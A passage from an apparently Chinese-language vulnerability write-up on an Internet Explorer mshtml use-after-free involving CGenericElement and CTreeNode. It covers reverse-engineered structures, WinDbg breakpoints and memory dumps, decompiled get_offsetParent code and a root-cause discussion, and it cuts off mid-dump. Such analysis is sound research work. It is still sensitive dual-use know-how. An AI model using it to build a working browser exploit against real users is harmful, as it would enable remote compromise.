CTreeNode * parent;</span><br><span class="line">    BYTE        _etag;                              <span class="comment">// 0-7:     element tag</span></span><br><span class="line">    BYTE        _fFirstCommonAncestorNode : <span class="number">1</span>;    <span class="comment">// 8:       for finding common ancestor</span></span><br><span class="line">    BYTE        _fInMarkup : <span class="number">1</span>;    <span class="comment">// 9:       this node is in a markup and shouldn't die</span></span><br><span class="line">    BYTE        _fInMarkupDestruction : <span class="number">1</span>;    <span class="comment">// 10:      Used by CMarkup::DestroySplayTree</span></span><br><span class="line">    BYTE        _fHasLookasidePtr : <span class="number">2</span>;    <span class="comment">// 11-12    Lookaside flags</span></span><br><span class="line">    BYTE        _fBlockNess : <span class="number">1</span>;    <span class="comment">// 13:      Cached from format -- valid if _iFF != -1</span></span><br><span class="line">    BYTE        _fHasLayout : <span class="number">1</span>;    <span class="comment">// 14:      Cached from format -- valid if _iFF != -1</span></span><br><span class="line">    BYTE        _fUnused : <span class="number">1</span>;    <span class="comment">// 15:      Unused</span></span><br><span class="line">    SHORT       _iPF;                               <span class="comment">// 16-31:   Paragraph Format</span></span><br><span class="line">                                                <span class="comment">// DWORD 2</span></span><br><span class="line">    SHORT       _iCF;                               <span class="comment">// 0-15:    Char Format</span></span><br><span class="line">    SHORT       _iFF;</span><br><span class="line"></span><br><span class="line">    CTreePos    _tpBegin;</span><br><span class="line">    CTreePos    _tpEnd;</span><br><span class="line">    DWORD      unknow1;</span><br><span class="line">    DWORD      unknow2;</span><br><span class="line">    DWORD      unknow3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>每创建一个元素都会创建相应的 <code>CTreeNode</code>，存储着元素的相关信息，并通过 <code>CTreePos</code> 对象构成 <code>DOM</code> 树。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTreePos</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    DWORD       _cElemLeftAndFlags; </span><br><span class="line">    DWORD       _cchLeft;           <span class="comment">// 左子树中的字符数量</span></span><br><span class="line">    CTreePos*   _pFirstChild;      </span><br><span class="line">    CTreePos*   _pNext;           </span><br><span class="line">    CTreePos*   _pLeft;              <span class="comment">//  当前 CTreePos 在 DOM 流中的左边</span></span><br><span class="line">    CTreePos*   _pRight;            <span class="comment">//  当前 CTreePos 在 DOM 流中的右边</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下面通过 <code>windbg</code> 调试观察 <code>CTreeNode</code> 和相应元素创建时在内存中的关系，调试信息如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">0:012&gt; bu mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4);gc&quot;</span><br><span class="line">0:012&gt; bu mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;</span><br><span class="line">Matched: 682f141a mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Matched: 6832d6de mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Ambiguous symbol error at &apos;mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;&apos;</span><br><span class="line">0:012&gt; bu 6832d6de  + 0x41 &quot;ln eax;gc&quot;</span><br><span class="line">0:012&gt; bu mshtml!CMarkup::InsertElementInternal+1ec &quot;.echo &apos;=== CTreeNode ===&apos;; dd eax L1; dps poi(eax) L1;gc&quot;</span><br><span class="line">0:012&gt; g</span><br><span class="line">............................</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">05ca1fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">05ca1fe8  00000000 00000000 00000000 00000000</span><br><span class="line">05ca1ff8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">07b3cfb0  05ca1fd8</span><br><span class="line">05ca1fd8  682a8fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07b6efd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07b6efe8  00000000 00000000 00000000 00000000</span><br><span class="line">07b6eff8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">053d6fb0  07b6efd8</span><br><span class="line">07b6efd8  682a8fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07b46fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07b46fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07b46ff8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">06bf6fb0  07b46fd8</span><br><span class="line">07b46fd8  682a8fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06c68fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">06c68fd8  00000000 00000000 00000000 00000000</span><br><span class="line">06c68fe8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">042f2fb0  06c68fc8</span><br><span class="line">06c68fc8  682bc590 mshtml!CGenericElement::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">08177fb8  681b5570 00000001 00000008 00000000</span><br><span class="line">08177fc8  00000000 00000000 00000000 00000000</span><br><span class="line">08177fd8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">07b34fb0  08177fb8</span><br><span class="line">08177fb8  681b6488 mshtml!CTable::`vftable&apos;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">05ca7fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">05ca7fe8  00000000 00000000 00000000 00000000</span><br><span class="line">05ca7ff8  00000000 00000000</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">05feffb0  05ca7fd8</span><br><span class="line">05ca7fd8  681b9250 mshtml!CHRElement::`vftable&apos;</span><br><span class="line">(ae4.dc8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=686e9100 ebx=042f2fb0 ecx=06c68fc8 edx=00000000 esi=0486cd10 edi=00000000</span><br><span class="line">eip=6836b68d esp=0486cce4 ebp=0486ccfc iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">mshtml!CElement::Doc:</span><br><span class="line">6836b68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:06c68fc8=????????</span><br></pre></td></tr></table></figure></p><p>可以看到 <code>CTreeNode</code> 的开始存放的是 <code>element</code> 的地址，和 <code>CTreeNode</code> 的数据结构吻合。元素对象的开始四字节是对应元素的虚表地址，第二个四字节是引用计数。下面继续分析 <code>poc</code> 里的 <code>offsetParent</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f0.offsetParent=null;</span><br></pre></td></tr></table></figure></p><p><code>windbg</code> 搜索 <code>offsetParent</code> 的相关函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; x mshtml!*offsetParent*</span><br><span class="line">681e128e mshtml!CDisplayRequestGetOffsetParent::~CDisplayRequestGetOffsetParent = &lt;no type information&gt;</span><br><span class="line">681e11ca mshtml!CDisplayRequestGetOffsetParent::CDisplayRequestGetOffsetParent = &lt;no type information&gt;</span><br><span class="line">681e16cd mshtml!CDisplayBox::IsOffsetParent = &lt;no type information&gt;</span><br><span class="line">681e1709 mshtml!CDisplayBox::FindOffsetParent = &lt;no type information&gt;</span><br><span class="line">681d9d65 mshtml!CDisplayRequestGetOffsetParent::GetOffsetTopLeft = &lt;no type information&gt;</span><br><span class="line">681e12b3 mshtml!CLayoutBlock::IsOffsetParent = &lt;no type information&gt;</span><br><span class="line">681e1915 mshtml!CDisplayRequestGetOffsetParent::SetOffsetParentDisplayBox = &lt;no type information&gt;</span><br><span class="line">681e11e3 mshtml!CDisplayRequestGetOffsetParent::OffsetParent = &lt;no type information&gt;</span><br><span class="line">682bcd62 mshtml!CElement::GetOffsetParentHelper = &lt;no type information&gt;</span><br><span class="line">681e19b1 mshtml!CTextDisplayBox::IsOffsetParent = &lt;no type information&gt;</span><br><span class="line">6837c914 mshtml!s_propdescCElementoffsetParent = &lt;no type information&gt;</span><br><span class="line">681e192d mshtml!CDisplayRequestGetOffsetParent::SetSourceDisplayBox = &lt;no type information&gt;</span><br><span class="line">682bd418 mshtml!CElement::get_offsetParent = &lt;no type information&gt;</span><br><span class="line">681e1798 mshtml!CDisplayBox::TransformRectToOffsetParent = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p><p>由上面的信息可以猜测到 <code>offsetParent</code> 和函数 <code>mshtml!CElement::get_offsetParent</code> 及 <code>mshtml!CElement::GetOffsetParentHelper</code> 有关系。实际上 <code>CElement::get_offsetParent</code> 中调用了 <code>CElement::GetOffsetParentHelper</code>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __thiscall CElement::get_offsetParent(CElement *ecx0, CElement *<span class="keyword">this</span>, struct IHTMLElement **a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">CTreeNode</span> *<span class="title">v4</span>;</span> <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_DWORD *)<span class="keyword">this</span> + <span class="number">5</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *a3 = <span class="number">0</span>;</span><br><span class="line">      v4 = CElement::GetOffsetParentHelper(ecx0);</span><br><span class="line">      <span class="keyword">if</span> ( v4 &amp;&amp; *((_BYTE *)v4 + <span class="number">8</span>) != <span class="number">82</span> )</span><br><span class="line">        v3 = CTreeNode::GetElementInterface(v4, &amp;IID_IHTMLElement, (<span class="keyword">void</span> **)a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">-2147467259</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">-2147467261</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> CBase::SetErrorInfo(ecx0, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>在 <code>poc</code> 分析的时候已经可以得到漏洞是由于 <code>CGenericElement</code> 在释放后又被引用导致的，一般会发生在下面两种情况下。</p><blockquote><ul><li><code>CGenericElement</code> 对象的指针存储到 <code>CTreeNode</code> 结构中时，<code>CGenericElement</code> 的引用计数没有加一, 导致<code>CGenericElement</code> 提前释放。</li><li><code>CTreeNode</code> 没有在 <code>CGenericElement</code> 元素释放的时候被释放。一般是由于 <code>CTreeNode</code> 的引用计数错误的加1</li></ul></blockquote><p>如何判断属于上面哪一种情况呢？在程序结尾处观察 <code>CGenericElement</code>  和 <code>CTreeNode</code> 是否被释放，调试信息如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bu mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4)&quot;</span><br><span class="line">0:013&gt; bu mshtml!CreateElement + 0x41 &quot;ln eax&quot;</span><br><span class="line">Matched: 6869141a mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Matched: 686cd6de mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Ambiguous symbol error at &apos;mshtml!CreateElement + 0x41 &quot;ln eax&quot;&apos;</span><br><span class="line">0:013&gt; bu 686cd6de + 0x41 &quot;ln eax&quot;</span><br><span class="line">0:013&gt; bu mshtml!CMarkup::InsertElementInternal+1ec &quot;.echo &apos;=== CTreeNode ===&apos;; dd eax; dps poi(eax) L1&quot;</span><br><span class="line">0:013&gt; g</span><br><span class="line">.............................................</span><br><span class="line">0:005&gt; g</span><br><span class="line">ModLoad: 6bf30000 6bfe2000   C:\Windows\System32\jscript.dll</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">079f7fd8  68555570 00000001 00000008 00000000</span><br><span class="line">079f7fe8  00000000 00000000 00000000 00000000</span><br><span class="line">079f7ff8  00000000 00000000</span><br><span class="line">eax=079f7fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=079f7fd8 edi=079f7fd8</span><br><span class="line">eip=686c9ff1 esp=0451c8c4 ebp=0451c8d0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">079d9fb0  079f7fd8 079edfb0 ffff005b ffffffff</span><br><span class="line">079d9fc0  00000000 00000000 00000000 00000000</span><br><span class="line">079d9fd0  00000000 00000000 00000000 00000000</span><br><span class="line">079d9fe0  00000000 00000000 00000000 00000000</span><br><span class="line">079d9ff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">079da000  ???????? ???????? ???????? ????????</span><br><span class="line">079da010  ???????? ???????? ???????? ????????</span><br><span class="line">079da020  ???????? ???????? ???????? ????????</span><br><span class="line">079f7fd8  68648fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">eax=079d9fb0 ebx=00000000 ecx=079d9fb0 edx=00000008 esi=079d9fb0 edi=079f7fd8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07a90fd8  68555570 00000001 00000008 00000000</span><br><span class="line">07a90fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07a90ff8  00000000 00000000</span><br><span class="line">eax=07a90fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=07a90fd8 edi=07a90fd8</span><br><span class="line">eip=686c9ff1 esp=0451c8c4 ebp=0451c8d0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">079e1fb0  07a90fd8 079edfb0 ffff005b ffffffff</span><br><span class="line">079e1fc0  00000000 00000000 00000000 00000000</span><br><span class="line">079e1fd0  00000000 00000000 00000000 00000000</span><br><span class="line">079e1fe0  00000000 00000000 00000000 00000000</span><br><span class="line">079e1ff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">079e2000  ???????? ???????? ???????? ????????</span><br><span class="line">079e2010  ???????? ???????? ???????? ????????</span><br><span class="line">079e2020  ???????? ???????? ???????? ????????</span><br><span class="line">07a90fd8  68648fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">eax=079e1fb0 ebx=00000000 ecx=079e1fb0 edx=00000008 esi=079e1fb0 edi=07a90fd8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07a63fd8  68555570 00000001 00000008 00000000</span><br><span class="line">07a63fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07a63ff8  00000000 00000000</span><br><span class="line">eax=07a63fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=07a63fd8 edi=07a63fd8</span><br><span class="line">eip=686c9ff1 esp=0451c8c4 ebp=0451c8d0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">07a9cfb0  07a63fd8 079edfb0 ffff005b ffffffff</span><br><span class="line">07a9cfc0  00000000 00000000 00000000 00000000</span><br><span class="line">07a9cfd0  00000000 00000000 00000000 00000000</span><br><span class="line">07a9cfe0  00000000 00000000 00000000 00000000</span><br><span class="line">07a9cff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">07a9d000  ???????? ???????? ???????? ????????</span><br><span class="line">07a9d010  ???????? ???????? ???????? ????????</span><br><span class="line">07a9d020  ???????? ???????? ???????? ????????</span><br><span class="line">07a63fd8  68648fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">eax=07a9cfb0 ebx=00000000 ecx=07a9cfb0 edx=00000008 esi=07a9cfb0 edi=07a63fd8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">076fefc8  68555570 00000001 00000008 00000000</span><br><span class="line">076fefd8  00000000 00000000 00000000 00000000</span><br><span class="line">076fefe8  00000000 00000000</span><br><span class="line">eax=076fefc8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=076fefc8 edi=076fefc8</span><br><span class="line">eip=686c9ff1 esp=0451c89c ebp=0451c8a8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">0770cfb0  076fefc8 07a9cfb0 ffff0075 ffffffff</span><br><span class="line">0770cfc0  00000000 00000000 00000000 00000000</span><br><span class="line">0770cfd0  00000000 00000000 00000000 00000000</span><br><span class="line">0770cfe0  00000000 00000000 00000000 00000000</span><br><span class="line">0770cff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">0770d000  ???????? ???????? ???????? ????????</span><br><span class="line">0770d010  ???????? ???????? ???????? ????????</span><br><span class="line">0770d020  ???????? ???????? ???????? ????????</span><br><span class="line">076fefc8  6865c590 mshtml!CGenericElement::`vftable&apos;</span><br><span class="line">eax=0770cfb0 ebx=00000000 ecx=0770cfb0 edx=00000008 esi=0770cfb0 edi=076fefc8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07a80fb8  68555570 00000001 00000008 00000000</span><br><span class="line">07a80fc8  00000000 00000000 00000000 00000000</span><br><span class="line">07a80fd8  00000000 00000000</span><br><span class="line">eax=07a80fb8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=07a80fb8 edi=07a80fb8</span><br><span class="line">eip=686c9ff1 esp=0451c8a8 ebp=0451c8b4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">07a72fb0  07a80fb8 079e1fb0 ffff0061 ffffffff</span><br><span class="line">07a72fc0  00000000 00000000 00000000 00000000</span><br><span class="line">07a72fd0  00000000 00000000 00000000 00000000</span><br><span class="line">07a72fe0  00000000 00000000 00000000 00000000</span><br><span class="line">07a72ff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">07a73000  ???????? ???????? ???????? ????????</span><br><span class="line">07a73010  ???????? ???????? ???????? ????????</span><br><span class="line">07a73020  ???????? ???????? ???????? ????????</span><br><span class="line">07a80fb8  68556488 mshtml!CTable::`vftable&apos;</span><br><span class="line">eax=07a72fb0 ebx=00000000 ecx=07a72fb0 edx=00000008 esi=07a72fb0 edi=07a80fb8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">05ec0fd8  68555570 00000001 00000008 00000000</span><br><span class="line">05ec0fe8  00000000 00000000 00000000 00000000</span><br><span class="line">05ec0ff8  00000000 00000000</span><br><span class="line">eax=05ec0fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=05ec0fd8 edi=05ec0fd8</span><br><span class="line">eip=686c9ff1 esp=0451c8b4 ebp=0451c8c0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span 